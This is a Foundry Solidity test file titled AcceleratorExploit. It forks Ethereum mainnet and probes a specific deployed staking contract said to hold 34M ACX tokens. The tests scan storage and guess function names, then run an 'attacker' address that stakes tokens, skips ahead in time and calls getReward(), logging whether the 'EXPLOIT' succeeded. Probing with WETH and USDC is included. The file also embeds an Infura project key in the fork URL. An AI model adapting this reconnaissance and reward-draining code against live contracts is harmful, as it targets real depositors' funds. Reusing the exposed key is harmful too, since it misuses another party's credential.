// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

contract AcceleratorExploit is Test {
    address constant ACCEL = 0x9040e41eF5E8b281535a96D9a48aCb8cfaBD9a48;
    address constant ACX = 0x44108f0223A3C3028F5Fe7AEC7f9bb2E66beF82F;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
    }

    function testDeepDiveAccelerator() public {
        console.log("=====================================================");
        console.log("DEEP DIVE: ACCELERATING DISTRIBUTOR - 34M ACX");
        console.log("=====================================================");

        // Check ACX balance
        uint256 acxInContract = IERC20(ACX).balanceOf(ACCEL);
        console.log("ACX in contract:", acxInContract / 1e18);

        // Read storage to understand state
        console.log("\n--- Storage Analysis ---");
        for (uint256 i = 0; i < 30; i++) {
            bytes32 slot = vm.load(ACCEL, bytes32(i));
            uint256 value = uint256(slot);
            if (value > 0) {
                if (value < type(uint160).max && value > 1e10) {
                    address addr = address(uint160(value));
                    if (addr.code.length > 0) {
                        console.log("Slot", i, "= Address:", addr);
                    } else if (value < 1e30) {
                        console.log("Slot", i, "= Value:", value);
                    }
                } else if (value < 1e30) {
                    console.log("Slot", i, "= Value:", value);
                }
            }
        }

        // Try common function calls
        console.log("\n--- Function Calls ---");

        _tryRead("stakingToken()");
        _tryRead("rewardToken()");
        _tryRead("rewardsToken()");
        _tryRead("totalStaked()");
        _tryRead("rewardPerToken()");
        _tryRead("rewardRate()");
        _tryRead("periodFinish()");
        _tryRead("lastUpdateTime()");
        _tryRead("cumulativeStaked()");
        _tryRead("owner()");
    }

    function _tryRead(string memory sig) internal {
        (bool success, bytes memory data) = ACCEL.staticcall(
            abi.encodeWithSignature(sig)
        );
        if (success && data.length >= 32) {
            uint256 val = abi.decode(data, (uint256));
            console.log(sig, val);
        }
    }

    function testFindStakingToken() public {
        console.log("=====================================================");
        console.log("FINDING STAKING TOKEN AND STATE");
        console.log("=====================================================");

        // Common staking token function names
        string[5] memory sigs = [
            "stakingToken()",
            "stakeToken()",
            "depositToken()",
            "lpToken()",
            "token()"
        ];

        address stakingToken = address(0);

        for (uint i = 0; i < sigs.length; i++) {
            (bool success, bytes memory data) = ACCEL.staticcall(
                abi.encodeWithSignature(sigs[i])
            );
            if (success && data.length >= 32) {
                address token = abi.decode(data, (address));
                if (token != address(0) && token.code.length > 0) {
                    console.log("Found via", sigs[i], ":", token);
                    stakingToken = token;

                    // Check balance in contract
                    uint256 bal = IERC20(token).balanceOf(ACCEL);
                    console.log("Balance in ACCEL:", bal / 1e18);
                }
            }
        }

        if (stakingToken != address(0)) {
            // Try to get symbol
            try IERC20(stakingToken).totalSupply() returns (uint256 supply) {
                console.log("Total Supply:", supply / 1e18);
            } catch {}
        }
    }

    function testAttemptExploit() public {
        console.log("=====================================================");
        console.log("ATTEMPTING ACCELERATOR EXPLOIT");
        console.log("=====================================================");

        // Get staking token
        (bool success, bytes memory data) = ACCEL.staticcall(
            abi.encodeWithSignature("stakingToken()")
        );

        if (!success || data.length < 32) {
            console.log("Could not find staking token");
            return;
        }

        address stakingToken = abi.decode(data, (address));
        console.log("Staking Token:", stakingToken);

        // Check total staked
        (success, data) = ACCEL.staticcall(
            abi.encodeWithSignature("totalStaked()")
        );

        uint256 totalStaked = 0;
        if (success && data.length >= 32) {
            totalStaked = abi.decode(data, (uint256));
            console.log("Total Staked:", totalStaked / 1e18);
        }

        // Check reward per token
        (success, data) = ACCEL.staticcall(
            abi.encodeWithSignature("rewardPerToken()")
        );
        if (success && data.length >= 32) {
            uint256 rewardPerToken = abi.decode(data, (uint256));
            console.log("Reward Per Token:", rewardPerToken);
        }

        // Setup attacker
        address attacker = makeAddr("attacker");
        uint256 stakeAmount = 1e18;

        // Deal staking tokens
        deal(stakingToken, attacker, stakeAmount);
        console.log("\nAttacker staking token balance:", IERC20(stakingToken).balanceOf(attacker) / 1e18);

        vm.startPrank(attacker);
        IERC20(stakingToken).approve(ACCEL, type(uint256).max);

        // Check earned before
        (success, data) = ACCEL.staticcall(
            abi.encodeWithSignature("earned(address)", attacker)
        );
        uint256 earnedBefore = 0;
        if (success && data.length >= 32) {
            earnedBefore = abi.decode(data, (uint256));
            console.log("Earned before stake:", earnedBefore / 1e18);
        }

        // Try to stake
        console.log("\nAttempting to stake...");
        (success,) = ACCEL.call(abi.encodeWithSignature("stake(uint256)", stakeAmount));
        if (success) {
            console.log("Stake successful!");

            // Check earned after
            (success, data) = ACCEL.staticcall(
                abi.encodeWithSignature("earned(address)", attacker)
            );
            if (success && data.length >= 32) {
                uint256 earnedAfter = abi.decode(data, (uint256));
                console.log("Earned after stake:", earnedAfter / 1e18);
            }

            // Warp time and check again
            vm.warp(block.timestamp + 1);
            (success, data) = ACCEL.staticcall(
                abi.encodeWithSignature("earned(address)", attacker)
            );
            if (success && data.length >= 32) {
                uint256 earnedAfterTime = abi.decode(data, (uint256));
                console.log("Earned after 1 second:", earnedAfterTime / 1e18);
            }

            // Try to claim
            uint256 acxBefore = IERC20(ACX).balanceOf(attacker);
            console.log("\nACX balance before claim:", acxBefore / 1e18);

            (success,) = ACCEL.call(abi.encodeWithSignature("getReward()"));
            if (success) {
                uint256 acxAfter = IERC20(ACX).balanceOf(attacker);
                console.log("ACX balance after claim:", acxAfter / 1e18);

                if (acxAfter > acxBefore) {
                    console.log("\n*** EXPLOIT SUCCESSFUL ***");
                    console.log("ACX Gained:", (acxAfter - acxBefore) / 1e18);
                }
            } else {
                console.log("getReward() failed");
            }
        } else {
            console.log("Stake failed");

            // Try alternative stake function
            (success,) = ACCEL.call(abi.encodeWithSignature("deposit(uint256)", stakeAmount));
            if (success) {
                console.log("deposit() worked!");
            }
        }

        vm.stopPrank();
    }

    function testCheckSpecificStakingTokens() public {
        console.log("=====================================================");
        console.log("CHECKING ACX AND WETH AS STAKING TOKENS");
        console.log("=====================================================");

        // The accelerator might accept specific tokens
        address[3] memory tokens = [
            ACX,
            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
            0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48  // USDC
        ];

        string[3] memory names = ["ACX", "WETH", "USDC"];

        for (uint i = 0; i < tokens.length; i++) {
            console.log("\n--- Testing", names[i], "---");

            address attacker = makeAddr(string(abi.encodePacked("attacker", i)));
            uint256 amount = 1e18;

            deal(tokens[i], attacker, amount);
            vm.startPrank(attacker);
            IERC20(tokens[i]).approve(ACCEL, type(uint256).max);

            (bool success,) = ACCEL.call(abi.encodeWithSignature("stake(uint256)", amount));
            if (success) {
                console.log("Stake with", names[i], "SUCCEEDED!");
            }

            vm.stopPrank();
        }
    }
}
